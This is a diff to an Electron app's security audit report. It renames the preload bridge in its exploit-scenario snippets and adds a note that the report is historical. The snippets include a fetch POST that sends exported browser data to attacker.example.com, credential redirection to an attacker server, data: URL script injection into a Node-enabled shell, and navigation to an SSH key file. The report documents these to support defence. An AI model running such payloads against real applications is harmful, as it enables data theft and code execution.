@@ -5,6 +5,12 @@
 **Electron version reviewed:** `^39.2.5` (see `package.json`)
 **Branch:** `audit`
 
+Current note (2026-07-03): this report is historical. Browser data no longer
+uses the reviewed `src/main/services/browserDataService.ts` main-service shape;
+current access goes through the manifest-declared browser-data broker
+(`providers.browserData.extension`) and `@workspace/panel-browser`. Findings
+below are retained for audit traceability.
+
 ---
 
 ## Executive summary
@@ -100,20 +106,17 @@ Services that declare `policy: { allowed: ["shell"] }` are still reachable from 
 **Exploit scenario.** A malicious panel (or a panel that has rendered attacker-controlled output such as an LLM response, remote URL etc.) in isolated-world-with-preload runs:
 
 ```js
-window.__vibez1Electron.serviceCall("remoteCred.save", {
+window.__vibez1Shell.serviceCall("remoteCred.save", {
   url: "https://attacker.example.com",
   token: "any",
 });
-window.__vibez1Electron.serviceCall("remoteCred.relaunch");
+window.__vibez1Shell.serviceCall("remoteCred.relaunch");
 ```
 
 The app now relaunches pointed at the attacker's "server", receives a new admin token, and authenticates. From there the attacker runs the whole Vibez1 backend including arbitrary code execution via panel builds. Alternatively:
 
 ```js
-window.__vibez1Electron.serviceCall("view.browserNavigate", [
-  "shell",
-  "data:text/html,<script>...",
-]);
+window.__vibez1Shell.serviceCall("view.browserNavigate", ["shell", "data:text/html,<script>..."]);
 ```
 
 redirects the shell itself (which runs with `nodeIntegration: true`, `contextIsolation: false`) to attacker HTML — and the shell is a Node process.
@@ -153,7 +156,7 @@ Even if [CRITICAL-1] is fixed, this policy _intentionally_ grants every panel fu
 **Exploit scenario.** Any panel (e.g. a weather widget) calls:
 
 ```js
-const all = await window.__vibez1Electron.serviceCall("browser-data.exportAll");
+const all = await window.__vibez1Shell.serviceCall("browser-data.exportAll");
 fetch("https://attacker.example.com/x", { method: "POST", body: all });
 ```
 
@@ -189,7 +192,7 @@ Contrast with `vibez1:getCdpEndpoint` which correctly enforces ownership via `cd
 
 **Exploit scenarios:**
 
-1. `serviceCall("view.browserNavigate", ["<any-panel-id>", "data:text/html,<script>...</script>"])` — drops attacker HTML into a victim panel's webContents. If that panel is an app panel with the panelPreload, the HTML now has `window.__vibez1Electron.serviceCall` at its disposal, inheriting the panel's `callerId`.
+1. `serviceCall("view.browserNavigate", ["<any-panel-id>", "data:text/html,<script>...</script>"])` — drops attacker HTML into a victim panel's webContents. If that panel is an app panel with the panelPreload, the HTML now has `window.__vibez1Shell.serviceCall` at its disposal, inheriting the panel's `callerId`.
 2. Navigate a browser panel to `file:///Users/victim/.ssh/id_rsa` and then scrape it via CDP if the attacker panel is the CDP-parent — though CDP is ownership-gated, so this narrower attack doesn't directly succeed. The first scenario is the dangerous one.
 3. Navigate the shell itself: `viewManager.getWebContents("shell").loadURL("file:///...")` — the shell runs with `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`. Any HTML served from `file://` or `data:` that ends up in the shell webContents gets Node access.
 
